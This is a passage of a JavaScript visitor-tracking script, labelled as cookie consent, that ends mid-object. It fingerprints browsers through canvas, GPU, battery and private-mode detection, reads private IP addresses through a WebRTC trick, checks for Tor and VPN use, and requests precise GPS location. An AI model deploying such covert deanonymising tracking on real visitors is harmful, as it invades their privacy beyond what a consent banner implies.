/**
 * Enhanced Cookie Consent & Visitor Logging System
 * Comprehensive visitor fingerprinting and analytics
 * Data stored in localStorage for CMS export
 */

(function() {
    'use strict';

    const CONSENT_KEY = 'visitor_cookie_consent';
    const LOGS_KEY = 'visitor_logs';
    const SESSION_KEY = 'visitor_session';

    // Session tracking
    let sessionData = {
        startTime: Date.now(),
        pageViews: 1,
        clicks: 0,
        scrollDepth: 0,
        mouseMovements: 0,
        keystrokes: 0,
        timeOnPage: 0
    };

    // Check if consent already given
    function hasConsent() {
        return localStorage.getItem(CONSENT_KEY) === 'accepted';
    }

    // Get browser details
    function getBrowserInfo() {
        const ua = navigator.userAgent;
        let browser = 'Unknown';
        let version = '';

        if (ua.includes('Firefox/')) {
            browser = 'Firefox';
            version = ua.split('Firefox/')[1].split(' ')[0];
        } else if (ua.includes('Edg/')) {
            browser = 'Microsoft Edge';
            version = ua.split('Edg/')[1].split(' ')[0];
        } else if (ua.includes('Chrome/')) {
            browser = 'Chrome';
            version = ua.split('Chrome/')[1].split(' ')[0];
        } else if (ua.includes('Safari/') && !ua.includes('Chrome')) {
            browser = 'Safari';
            version = ua.split('Version/')[1]?.split(' ')[0] || '';
        } else if (ua.includes('MSIE') || ua.includes('Trident/')) {
            browser = 'Internet Explorer';
        } else if (ua.includes('Opera') || ua.includes('OPR/')) {
            browser = 'Opera';
            version = ua.split('OPR/')[1]?.split(' ')[0] || '';
        } else if (ua.includes('Samsung')) {
            browser = 'Samsung Internet';
        } else if (ua.includes('UCBrowser')) {
            browser = 'UC Browser';
        }

        return { browser, version, userAgent: ua };
    }

    // Get OS details with more granularity
    function getOSInfo() {
        const ua = navigator.userAgent;
        let os = 'Unknown';
        let osVersion = '';
        let architecture = 'Unknown';

        // Detect architecture
        if (ua.includes('Win64') || ua.includes('x64') || ua.includes('WOW64')) {
            architecture = '64-bit';
        } else if (ua.includes('Win32') || ua.includes('x86')) {
            architecture = '32-bit';
        } else if (ua.includes('arm') || ua.includes('ARM')) {
            architecture = 'ARM';
        }

        if (ua.includes('Windows NT 10.0')) {
            os = 'Windows';
            osVersion = ua.includes('Windows NT 10.0; Win64') ? '10/11 64-bit' : '10/11';
        } else if (ua.includes('Windows NT 6.3')) {
            os = 'Windows';
            osVersion = '8.1';
        } else if (ua.includes('Windows NT 6.2')) {
            os = 'Windows';
            osVersion = '8';
        } else if (ua.includes('Windows NT 6.1')) {
            os = 'Windows';
            osVersion = '7';
        } else if (ua.includes('Mac OS X')) {
            os = 'macOS';
            const match = ua.match(/Mac OS X (\d+[._]\d+[._]?\d*)/);
            osVersion = match ? match[1].replace(/_/g, '.') : '';
        } else if (ua.includes('Android')) {
            os = 'Android';
            const match = ua.match(/Android (\d+\.?\d*\.?\d*)/);
            osVersion = match ? match[1] : '';
        } else if (ua.includes('iPhone') || ua.includes('iPad')) {
            os = ua.includes('iPhone') ? 'iOS (iPhone)' : 'iOS (iPad)';
            const match = ua.match(/OS (\d+_\d+_?\d*)/);
            osVersion = match ? match[1].replace(/_/g, '.') : '';
        } else if (ua.includes('Linux')) {
            os = 'Linux';
            if (ua.includes('Ubuntu')) osVersion = 'Ubuntu';
            else if (ua.includes('Fedora')) osVersion = 'Fedora';
            else if (ua.includes('Debian')) osVersion = 'Debian';
        } else if (ua.includes('CrOS')) {
            os = 'Chrome OS';
        }

        return { os, osVersion, architecture };
    }

    // Get device type with model detection
    function getDeviceInfo() {
        const ua = navigator.userAgent.toLowerCase();
        const uaOriginal = navigator.userAgent;
        let deviceType = 'Desktop';
        let deviceModel = 'Unknown';
        let deviceBrand = 'Unknown';

        // Multiple detection methods for reliability

        // Method 1: User Agent detection
        const isMobileUA = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|phone|tablet|kindle|silk|playbook/i.test(uaOriginal);

        // Method 2: Touch capability
        const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;

        // Method 3: Screen size (mobile typically < 768px width)
        const isSmallScreen = window.screen.width < 768;

        // Method 4: Pointer type (coarse = touch, fine = mouse)
        const isCoarsePointer = window.matchMedia('(pointer: coarse)').matches;

        // Method 5: Hover capability (mobile typically can't hover)
        const cannotHover = window.matchMedia('(hover: none)').matches;

        // Tablet detection
        if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(uaOriginal)) {
            deviceType = 'Tablet';
        }
        // Mobile detection - use multiple signals
        else if (
            /Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Opera M(obi|ini)|webOS|phone/i.test(uaOriginal) ||
            (hasTouch && isSmallScreen) ||
            (isCoarsePointer && cannotHover && hasTouch)
        ) {
            deviceType = 'Mobile';
        }
        // Additional check: if touch + small screen, likely mobile even if UA says otherwise
        else if (hasTouch && isSmallScreen && isCoarsePointer) {
            deviceType = 'Mobile';
        }

        // Detect device brand/model (use lowercase ua for comparison)
        if (ua.includes('iphone')) {
            deviceBrand = 'Apple';
            deviceModel = 'iPhone';
            deviceType = 'Mobile';
        } else if (ua.includes('ipad')) {
            deviceBrand = 'Apple';
            deviceModel = 'iPad';
            deviceType = 'Tablet';
        } else if (ua.includes('samsung')) {
            deviceBrand = 'Samsung';
            const match = uaOriginal.match(/SM-[A-Z0-9]+/i) || uaOriginal.match(/Samsung[^;)]*/i);
            deviceModel = match ? match[0] : 'Samsung Device';
        } else if (ua.includes('pixel')) {
            deviceBrand = 'Google';
            const match = uaOriginal.match(/Pixel[^;)]*/i);
            deviceModel = match ? match[0] : 'Pixel';
        } else if (ua.includes('oneplus')) {
            deviceBrand = 'OnePlus';
            const match = uaOriginal.match(/OnePlus[^;)]*/i);
            deviceModel = match ? match[0] : 'OnePlus Device';
        } else if (ua.includes('xiaomi') || ua.includes('redmi') || ua.includes('poco') || ua.includes('mi ')) {
            deviceBrand = 'Xiaomi';
            const match = uaOriginal.match(/(Redmi|POCO|Mi)[^;)]*/i);
            deviceModel = match ? match[0] : 'Xiaomi Device';
        } else if (ua.includes('huawei') || ua.includes('honor')) {
            deviceBrand = 'Huawei';
            const match = uaOriginal.match(/(HUAWEI|Honor)[^;)]*/i);
            deviceModel = match ? match[0] : 'Huawei Device';
        } else if (ua.includes('oppo') || ua.includes('cph')) {
            deviceBrand = 'OPPO';
            const match = uaOriginal.match(/(OPPO|CPH)[^;)]*/i);
            deviceModel = match ? match[0] : 'OPPO Device';
        } else if (ua.includes('vivo')) {
            deviceBrand = 'Vivo';
            const match = uaOriginal.match(/vivo[^;)]*/i);
            deviceModel = match ? match[0] : 'Vivo Device';
        } else if (ua.includes('realme') || ua.includes('rmx')) {
            deviceBrand = 'Realme';
            const match = uaOriginal.match(/(Realme|RMX)[^;)]*/i);
            deviceModel = match ? match[0] : 'Realme Device';
        } else if (ua.includes('motorola') || ua.includes('moto')) {
            deviceBrand = 'Motorola';
            const match = uaOriginal.match(/moto[^;)]*/i);
            deviceModel = match ? match[0] : 'Motorola Device';
        } else if (ua.includes('nokia')) {
            deviceBrand = 'Nokia';
        } else if (ua.includes(' lg')) {
            deviceBrand = 'LG';
        } else if (ua.includes('sony') || ua.includes('xperia')) {
            deviceBrand = 'Sony';
        } else if (ua.includes('htc')) {
            deviceBrand = 'HTC';
        } else if (ua.includes('asus') || ua.includes('zenfone')) {
            deviceBrand = 'Asus';
        } else if (ua.includes('lenovo')) {
            deviceBrand = 'Lenovo';
        } else if (ua.includes('nothing')) {
            deviceBrand = 'Nothing';
        } else if (ua.includes('android')) {
            deviceBrand = 'Android Device';
        }

        return {
            deviceType,
            deviceModel,
            deviceBrand,
            // Detection signals for debugging
            detectionSignals: {
                hasTouch,
                isSmallScreen,
                isCoarsePointer,
                cannotHover,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height
            }
        };
    }

    // Get comprehensive screen info
    function getScreenInfo() {
        const screen = window.screen;
        return {
            screenWidth: screen.width,
            screenHeight: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            viewportWidth: window.innerWidth,
            viewportHeight: window.innerHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            pixelRatio: window.devicePixelRatio || 1,
            orientation: screen.orientation ? screen.orientation.type : 'Unknown',
            isRetina: window.devicePixelRatio > 1,
            aspectRatio: (screen.width / screen.height).toFixed(2)
        };
    }

    // Get hardware information
    function getHardwareInfo() {
        return {
            cpuCores: navigator.hardwareConcurrency || 'Unknown',
            deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
            maxTouchPoints: navigator.maxTouchPoints || 0,
            touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
            pointerType: window.matchMedia('(pointer: coarse)').matches ? 'Touch' :
                        window.matchMedia('(pointer: fine)').matches ? 'Mouse' : 'Unknown',
            hoverCapability: window.matchMedia('(hover: hover)').matches ? 'Yes' : 'No'
        };
    }

    // Get GPU/WebGL information
    function getGPUInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    return {
                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                        webglVersion: gl.getParameter(gl.VERSION),
                        shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                        maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS)
                    };
                }
            }
        } catch (e) {}
        return { vendor: 'Unknown', renderer: 'Unknown' };
    }

    // Get battery information
    async function getBatteryInfo() {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                return {
                    charging: battery.charging,
                    level: Math.round(battery.level * 100) + '%',
                    chargingTime: battery.chargingTime === Infinity ? 'N/A' : battery.chargingTime + 's',
                    dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : battery.dischargingTime + 's'
                };
            }
        } catch (e) {}
        return { available: false };
    }

    // Get connection info with more details
    function getConnectionInfo() {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            return {
                effectiveType: conn.effectiveType || 'Unknown',
                downlink: conn.downlink ? conn.downlink + ' Mbps' : 'Unknown',
                rtt: conn.rtt ? conn.rtt + ' ms' : 'Unknown',
                saveData: conn.saveData ? 'Enabled' : 'Disabled',
                type: conn.type || 'Unknown'
            };
        }
        return { effectiveType: 'Unknown', downlink: 'Unknown', rtt: 'Unknown' };
    }

    // Get media devices (cameras, microphones)
    async function getMediaDevices() {
        try {
            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                const devices = await navigator.mediaDevices.enumerateDevices();
                const cameras = devices.filter(d => d.kind === 'videoinput').length;
                const microphones = devices.filter(d => d.kind === 'audioinput').length;
                const speakers = devices.filter(d => d.kind === 'audiooutput').length;
                return { cameras, microphones, speakers };
            }
        } catch (e) {}
        return { cameras: 'Unknown', microphones: 'Unknown', speakers: 'Unknown' };
    }

    // Get storage information
    async function getStorageInfo() {
        try {
            if (navigator.storage && navigator.storage.estimate) {
                const estimate = await navigator.storage.estimate();
                return {
                    quota: (estimate.quota / (1024 * 1024 * 1024)).toFixed(2) + ' GB',
                    usage: (estimate.usage / (1024 * 1024)).toFixed(2) + ' MB',
                    percentUsed: ((estimate.usage / estimate.quota) * 100).toFixed(2) + '%'
                };
            }
        } catch (e) {}
        return { quota: 'Unknown', usage: 'Unknown' };
    }

    // Generate canvas fingerprint
    function getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200;
            canvas.height = 50;

            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.font = '14px Arial';
            ctx.fillText('Fingerprint', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.font = '18px Arial';
            ctx.fillText('Canvas', 4, 45);

            const dataURL = canvas.toDataURL();
            let hash = 0;
            for (let i = 0; i < dataURL.length; i++) {
                hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
                hash = hash & hash;
            }
            return Math.abs(hash).toString(16);
        } catch (e) {
            return 'Unknown';
        }
    }

    // Get audio fingerprint
    function getAudioFingerprint() {
        try {
            const AudioContext = window.AudioContext || window.webkitAudioContext;
            if (AudioContext) {
                const context = new AudioContext();
                const oscillator = context.createOscillator();
                const analyser = context.createAnalyser();
                const gain = context.createGain();
                const processor = context.createScriptProcessor(4096, 1, 1);

                gain.gain.value = 0;
                oscillator.type = 'triangle';
                oscillator.connect(analyser);
                analyser.connect(processor);
                processor.connect(gain);
                gain.connect(context.destination);
                oscillator.start(0);

                context.close();
                return 'Supported';
            }
        } catch (e) {}
        return 'Not Supported';
    }

    // Get installed plugins
    function getPlugins() {
        const plugins = [];
        if (navigator.plugins) {
            for (let i = 0; i < Math.min(navigator.plugins.length, 10); i++) {
                plugins.push(navigator.plugins[i].name);
            }
        }
        return plugins.length > 0 ? plugins : ['None detected'];
    }

    // Detect ad blocker
    async function detectAdBlocker() {
        try {
            const testAd = document.createElement('div');
            testAd.innerHTML = '&nbsp;';
            testAd.className = 'adsbox ad-placement ad-banner';
            testAd.style.cssText = 'position:absolute;left:-9999px;';
            document.body.appendChild(testAd);
            await new Promise(r => setTimeout(r, 100));
            const blocked = testAd.offsetHeight === 0;
            testAd.remove();
            return blocked ? 'Detected' : 'Not Detected';
        } catch (e) {
            return 'Unknown';
        }
    }

    // Detect incognito/private mode
    async function detectPrivateMode() {
        try {
            const storage = window.localStorage;
            storage.setItem('test', '1');
            storage.removeItem('test');

            if ('storage' in navigator && 'estimate' in navigator.storage) {
                const {quota} = await navigator.storage.estimate();
                if (quota < 120000000) return 'Likely Private';
            }
            return 'Normal Mode';
        } catch (e) {
            return 'Likely Private';
        }
    }

    // Get timezone details
    function getTimezoneInfo() {
        const date = new Date();
        return {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: -date.getTimezoneOffset() / 60 + ' hours from UTC',
            dst: date.getTimezoneOffset() < Math.max(
                new Date(date.getFullYear(), 0, 1).getTimezoneOffset(),
                new Date(date.getFullYear(), 6, 1).getTimezoneOffset()
            ) ? 'Active' : 'Inactive'
        };
    }

    // Get language and locale info
    function getLanguageInfo() {
        return {
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
            locale: Intl.DateTimeFormat().resolvedOptions().locale,
            numberFormat: new Intl.NumberFormat().resolvedOptions().locale,
            currency: Intl.NumberFormat(navigator.language, {style: 'currency', currency: 'USD'})
                .resolvedOptions().currency
        };
    }

    // Get browser features/capabilities
    function getBrowserCapabilities() {
        return {
            cookiesEnabled: navigator.cookieEnabled,
            javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
            doNotTrack: navigator.doNotTrack === '1' ? 'Enabled' : 'Disabled',
            pdfViewerEnabled: navigator.pdfViewerEnabled || 'Unknown',
            webdriver: navigator.webdriver ? 'Yes (Bot Detected)' : 'No',
            serviceWorker: 'serviceWorker' in navigator ? 'Supported' : 'Not Supported',
            pushNotifications: 'PushManager' in window ? 'Supported' : 'Not Supported',
            notifications: 'Notification' in window ? Notification.permission : 'Not Supported',
            geolocation: 'geolocation' in navigator ? 'Supported' : 'Not Supported',
            bluetooth: 'bluetooth' in navigator ? 'Supported' : 'Not Supported',
            usb: 'usb' in navigator ? 'Supported' : 'Not Supported',
            webgl: !!document.createElement('canvas').getContext('webgl') ? 'Supported' : 'Not Supported',
            webgl2: !!document.createElement('canvas').getContext('webgl2') ? 'Supported' : 'Not Supported',
            webrtc: 'RTCPeerConnection' in window ? 'Supported' : 'Not Supported',
            websocket: 'WebSocket' in window ? 'Supported' : 'Not Supported',
            indexedDB: 'indexedDB' in window ? 'Supported' : 'Not Supported',
            localStorage: 'localStorage' in window ? 'Supported' : 'Not Supported',
            sessionStorage: 'sessionStorage' in window ? 'Supported' : 'Not Supported',
            webWorkers: 'Worker' in window ? 'Supported' : 'Not Supported',
            sharedWorkers: 'SharedWorker' in window ? 'Supported' : 'Not Supported'
        };
    }

    // Get social media detection (check if logged into platforms)
    function getSocialMediaHints() {
        // This only checks for potential login state via timing, not actual data
        return {
            note: 'Social login detection requires explicit user interaction'
        };
    }

    // Track user behavior
    function initBehaviorTracking() {
        // Track clicks
        document.addEventListener('click', () => {
            sessionData.clicks++;
        });

        // Track scroll depth
        document.addEventListener('scroll', () => {
            const scrollHeight = document.documentElement.scrollHeight - window.innerHeight;
            const scrolled = (window.scrollY / scrollHeight) * 100;
            sessionData.scrollDepth = Math.max(sessionData.scrollDepth, Math.round(scrolled));
        });

        // Track mouse movements (sampled)
        let moveCount = 0;
        document.addEventListener('mousemove', () => {
            moveCount++;
            if (moveCount % 10 === 0) sessionData.mouseMovements++;
        });

        // Track keystrokes (count only, not content)
        document.addEventListener('keydown', () => {
            sessionData.keystrokes++;
        });

        // Update time on page periodically
        setInterval(() => {
            sessionData.timeOnPage = Math.round((Date.now() - sessionData.startTime) / 1000);
        }, 1000);
    }

    // Get referrer analysis
    function getReferrerInfo() {
        const referrer = document.referrer;
        let source = 'Direct';
        let medium = 'None';
        let campaign = 'None';

        if (referrer) {
            try {
                const refUrl = new URL(referrer);
                source = refUrl.hostname;

                if (refUrl.hostname.includes('google')) {
                    medium = 'Organic Search';
                    source = 'Google';
                } else if (refUrl.hostname.includes('facebook') || refUrl.hostname.includes('fb.')) {
                    medium = 'Social';
                    source = 'Facebook';
                } else if (refUrl.hostname.includes('twitter') || refUrl.hostname.includes('t.co')) {
                    medium = 'Social';
                    source = 'Twitter/X';
                } else if (refUrl.hostname.includes('linkedin')) {
                    medium = 'Social';
                    source = 'LinkedIn';
                } else if (refUrl.hostname.includes('instagram')) {
                    medium = 'Social';
                    source = 'Instagram';
                } else if (refUrl.hostname.includes('youtube')) {
                    medium = 'Social';
                    source = 'YouTube';
                } else if (refUrl.hostname.includes('bing')) {
                    medium = 'Organic Search';
                    source = 'Bing';
                } else if (refUrl.hostname.includes('yahoo')) {
                    medium = 'Organic Search';
                    source = 'Yahoo';
                } else {
                    medium = 'Referral';
                }
            } catch (e) {}
        }

        // Check UTM parameters
        const urlParams = new URLSearchParams(window.location.search);
        return {
            fullReferrer: referrer || 'Direct',
            source: urlParams.get('utm_source') || source,
            medium: urlParams.get('utm_medium') || medium,
            campaign: urlParams.get('utm_campaign') || campaign,
            term: urlParams.get('utm_term') || 'None',
            content: urlParams.get('utm_content') || 'None'
        };
    }

    // Get local/private IPs via WebRTC
    async function getLocalIPs() {
        return new Promise((resolve) => {
            const ips = {
                private: [],
                public: [],
                ipv6: []
            };

            try {
                const RTCPeerConnection = window.RTCPeerConnection ||
                                         window.mozRTCPeerConnection ||
                                         window.webkitRTCPeerConnection;

                if (!RTCPeerConnection) {
                    resolve(ips);
                    return;
                }

                const pc = new RTCPeerConnection({
                    iceServers: [
                        { urls: 'stun:stun.l.google.com:19302' },
                        { urls: 'stun:stun1.l.google.com:19302' },
                        { urls: 'stun:stun2.l.google.com:19302' }
                    ]
                });

                pc.createDataChannel('');

                pc.onicecandidate = (event) => {
                    if (!event || !event.candidate) return;

                    const candidate = event.candidate.candidate;
                    if (!candidate) return;

                    // Extract IP from candidate string
                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/g;
                    const ipv6Regex = /([a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}|([a-f0-9]{1,4}:){1,7}:|([a-f0-9]{1,4}:){1,6}:[a-f0-9]{1,4})/gi;

                    const ipv4Matches = candidate.match(ipRegex);
                    const ipv6Matches = candidate.match(ipv6Regex);

                    if (ipv4Matches) {
                        ipv4Matches.forEach(ip => {
                            // Classify IP
                            if (ip.startsWith('10.') ||
                                ip.startsWith('192.168.') ||
                                ip.match(/^172\.(1[6-9]|2[0-9]|3[0-1])\./) ||
                                ip.startsWith('169.254.')) {
                                if (!ips.private.includes(ip)) ips.private.push(ip);
                            } else if (!ip.startsWith('0.') && ip !== '0.0.0.0') {
                                if (!ips.public.includes(ip)) ips.public.push(ip);
                            }
                        });
                    }

                    if (ipv6Matches) {
                        ipv6Matches.forEach(ip => {
                            if (!ips.ipv6.includes(ip)) ips.ipv6.push(ip);
                        });
                    }
                };

                pc.createOffer()
                    .then(offer => pc.setLocalDescription(offer))
                    .catch(() => {});

                // Wait for ICE gathering
                setTimeout(() => {
                    pc.close();
                    resolve(ips);
                }, 3000);

            } catch (e) {
                resolve(ips);
            }
        });
    }

    // Get all public IPs from multiple sources
    async function getAllPublicIPs() {
        const results = {
            ipv4: [],
            ipv6: [],
            sources: {}
        };

        // Multiple IP detection services
        const ipServices = [
            { name: 'ipify-v4', url: 'https://api.ipify.org?format=json', parser: (d) => d.ip },
            { name: 'ipify-v6', url: 'https://api64.ipify.org?format=json', parser: (d) => d.ip },
            { name: 'icanhazip', url: 'https://icanhazip.com', parser: (d) => d.trim(), isText: true },
            { name: 'ipinfo', url: 'https://ipinfo.io/json', parser: (d) => d.ip },
            { name: 'myip', url: 'https://api.myip.com', parser: (d) => d.ip }
        ];

        const fetchPromises = ipServices.map(async (service) => {
            try {
                const response = await fetch(service.url, { timeout: 5000 });
                if (!response.ok) return null;

                let data;
                if (service.isText) {
                    data = await response.text();
                } else {
                    data = await response.json();
                }

                const ip = service.parser(data);
                if (ip) {
                    results.sources[service.name] = ip;

                    // Classify as IPv4 or IPv6
                    if (ip.includes(':')) {
                        if (!results.ipv6.includes(ip)) results.ipv6.push(ip);
                    } else if (ip.match(/^[\d.]+$/)) {
                        if (!results.ipv4.includes(ip)) results.ipv4.push(ip);
                    }
                }
            } catch (e) {
                // Service failed, continue with others
            }
        });

        await Promise.allSettled(fetchPromises);
        return results;
    }

    // Fetch comprehensive location data from IP
    async function getLocationData() {
        let locationData = {
            publicIP: 'Unknown',
            allIPs: {
                public: { ipv4: [], ipv6: [] },
                private: [],
                webrtc: { private: [], public: [], ipv6: [] }
            }
        };

        // Get WebRTC IPs (local network IPs)
        try {
            const webrtcIPs = await getLocalIPs();
            locationData.allIPs.webrtc = webrtcIPs;
        } catch (e) {}

        // Get all public IPs from multiple sources
        try {
            const publicIPs = await getAllPublicIPs();
            locationData.allIPs.public = publicIPs;
        } catch (e) {}

        // Primary location API with full details
        try {
            const response = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query');
            if (response.ok) {
                const data = await response.json();

                if (data.status === 'success') {
                    locationData = {
                        ...locationData,
                        publicIP: data.query,
                        city: data.city,
                        district: data.district || 'N/A',
                        region: data.regionName,
                        regionCode: data.region,
                        country: data.country,
                        countryCode: data.countryCode,
                        zipCode: data.zip,
                        latitude: data.lat,
                        longitude: data.lon,
                        timezone: data.timezone,
                        utcOffset: data.offset ? (data.offset / 3600) + ' hours' : 'N/A',
                        currency: data.currency || 'N/A',
                        isp: data.isp,
                        organization: data.org,
                        asn: data.as,
                        asnName: data.asname || 'N/A',
                        reverseDNS: data.reverse || 'N/A',
                        connectionType: data.mobile ? 'Mobile Network' : 'Fixed/Broadband',
                        isMobile: data.mobile ? 'Yes' : 'No',
                        isProxy: data.proxy ? 'Yes' : 'No',
                        isVPN: data.proxy ? 'Likely' : 'No',
                        isHosting: data.hosting ? 'Yes (Data Center/Cloud)' : 'No',
                        isTor: 'Checking...'
                    };
                }
            }
        } catch (error) {
            console.log('Primary location API failed, trying backup...');
        }

        // Backup/Additional API for more details
        try {
            const response = await fetch('https://ipapi.co/json/');
            if (response.ok) {
                const data = await response.json();

                // Merge additional data
                locationData.ipVersion = data.version || (locationData.publicIP.includes(':') ? 'IPv6' : 'IPv4');
                locationData.network = data.network || 'N/A';
                locationData.countryCallingCode = data.country_calling_code || 'N/A';
                locationData.countryCapital = data.country_capital || 'N/A';
                locationData.countryArea = data.country_area ? data.country_area + ' sq km' : 'N/A';
                locationData.countryPopulation = data.country_population || 'N/A';
                locationData.continentCode = data.continent_code || 'N/A';
                locationData.inEU = data.in_eu ? 'Yes' : 'No';
                locationData.languages = data.languages || 'N/A';

                // If primary failed, use backup data
                if (locationData.publicIP === 'Unknown') {
                    locationData.publicIP = data.ip;
                    locationData.city = data.city;
                    locationData.region = data.region;
                    locationData.country = data.country_name;
                    locationData.zipCode = data.postal;
                    locationData.latitude = data.latitude;
                    locationData.longitude = data.longitude;
                    locationData.timezone = data.timezone;
                    locationData.isp = data.org;
                    locationData.asn = data.asn;
                }
            }
        } catch (e) {}

        // Try to get IPv6 specifically
        try {
            const response = await fetch('https://api64.ipify.org?format=json');
            if (response.ok) {
                const data = await response.json();
                if (data.ip && data.ip.includes(':')) {
                    locationData.ipv6Address = data.ip;
                    if (!locationData.allIPs.public.ipv6.includes(data.ip)) {
                        locationData.allIPs.public.ipv6.push(data.ip);
                    }
                }
            }
        } catch (e) {}

        // Try to detect Tor
        try {
            const torCheckServices = [
                'https://check.torproject.org/api/ip'
            ];
            for (const url of torCheckServices) {
                try {
                    const response = await fetch(url);
                    if (response.ok) {
                        const data = await response.json();
                        locationData.isTor = data.IsTor ? 'Yes' : 'No';
                        break;
                    }
                } catch (e) {}
            }
        } catch (e) {
            locationData.isTor = 'Unknown';
        }

        // Summarize all IPs found
        const allIPsList = [];

        // Add public IPv4s
        if (locationData.allIPs.public.ipv4) {
            locationData.allIPs.public.ipv4.forEach(ip => {
                if (!allIPsList.includes(ip)) allIPsList.push({ ip, type: 'Public IPv4' });
            });
        }

        // Add public IPv6s
        if (locationData.allIPs.public.ipv6) {
            locationData.allIPs.public.ipv6.forEach(ip => {
                if (!allIPsList.find(x => x.ip === ip)) allIPsList.push({ ip, type: 'Public IPv6' });
            });
        }

        // Add WebRTC private IPs
        if (locationData.allIPs.webrtc.private) {
            locationData.allIPs.webrtc.private.forEach(ip => {
                if (!allIPsList.find(x => x.ip === ip)) allIPsList.push({ ip, type: 'Private/Local (WebRTC)' });
            });
        }

        // Add WebRTC public IPs
        if (locationData.allIPs.webrtc.public) {
            locationData.allIPs.webrtc.public.forEach(ip => {
                if (!allIPsList.find(x => x.ip === ip)) allIPsList.push({ ip, type: 'Public (WebRTC STUN)' });
            });
        }

        // Add WebRTC IPv6
        if (locationData.allIPs.webrtc.ipv6) {
            locationData.allIPs.webrtc.ipv6.forEach(ip => {
                if (!allIPsList.find(x => x.ip === ip)) allIPsList.push({ ip, type: 'IPv6 (WebRTC)' });
            });
        }

        locationData.allIPsSummary = allIPsList;
        locationData.totalIPsFound = allIPsList.length;

        return locationData;
    }

    // Get precise GPS location via Geolocation API
    async function getPreciseLocation() {
        return new Promise((resolve) => {
            const result = {
                available: false,
                permission: 'unknown',
                gpsCoordinates: null,
                accuracy: null,
                altitude: null,
                altitudeAccuracy: null,
                heading: null,
                speed: null,
                timestamp: null
            };

            if (!navigator.geolocation) {
                result.permission = 'not_supported';
                resolve(result);
                return;
            }

            // Request high accuracy GPS
            const options = {
                enableHighAccuracy: true,  // Use GPS, not just IP/WiFi
                timeout: 10000,            // Wait up to 10 seconds
                maximumAge: 0              // Don't use cached position
            };

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    result.available = true;
                    result.permission = 'granted';
                    result.gpsCoordinates = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };
                    result.accuracy = position.coords.accuracy ? Math.round(position.coords.accuracy) + ' meters' : null;
                    result.altitude = position.coords.altitude ? Math.round(position.coords.altitude) + ' meters' : null;
                    result.altitudeAccuracy = position.coords.altitudeAccuracy ? Math.round(position.coords.altitudeAccuracy) + ' meters' : null;
                    result.heading = position.coords.heading ? Math.round(position.coords.heading) + '°' : null;
                    result.speed = position.coords.speed ? (position.coords.speed * 3.6).toFixed(1) + ' km/h' : null;
                    result.timestamp = new Date(position.timestamp).toISOString();

                    // Calculate Google Maps link
                    result.googleMapsLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;

                    resolve(result);
                },
                (error) => {
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            result.permission = 'denied';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            result.permission = 'unavailable';
                            break;
                        case error.TIMEOUT:
                            result.permission = 'timeout';
                            break;
                        default:
                            result.permission = 'error';
                    }
                    result.error = error.message;
                    resolve(result);
                },
                options
            );

            // Fallback timeout
            setTimeout(() => {
                if (!result.available && result.permission === 'unknown') {
                    result.permission = 'timeout';
                    resolve(result);
                }
            }, 12000);
        });
    }

    // Collect all visitor data
    async function collectVisitorData() {
        const browserInfo = getBrowserInfo();
        const osInfo = getOSInfo();
        const deviceInfo = getDeviceInfo();
        const screenInfo = getScreenInfo();
        const hardwareInfo = getHardwareInfo();
        const gpuInfo = getGPUInfo();
        const connectionInfo = getConnectionInfo();
        const timezoneInfo = getTimezoneInfo();
        const languageInfo = getLanguageInfo();
        const capabilities = getBrowserCapabilities();
        const referrerInfo = getReferrerInfo();
        const plugins = getPlugins();
        const canvasFingerprint = getCanvasFingerprint();
        const audioFingerprint = getAudioFingerprint();

        // Async data
        const [locationData, batteryInfo, mediaDevices, storageInfo, adBlocker, privateMode, preciseGPS] =
            await Promise.all([
                getLocationData(),
                getBatteryInfo(),
                getMediaDevices(),
                getStorageInfo(),
                detectAdBlocker(),
                detectPrivateMode(),
                getPreciseLocation()
            ]);

        return {
            // Meta
            timestamp: new Date().toISOString(),
            localTime: new Date().toLocaleString(),
            visitId: 'v_' + Date.now().toString(36) + Math.random().toString(36).substr(2, 5),

            // Page Info
            page: {
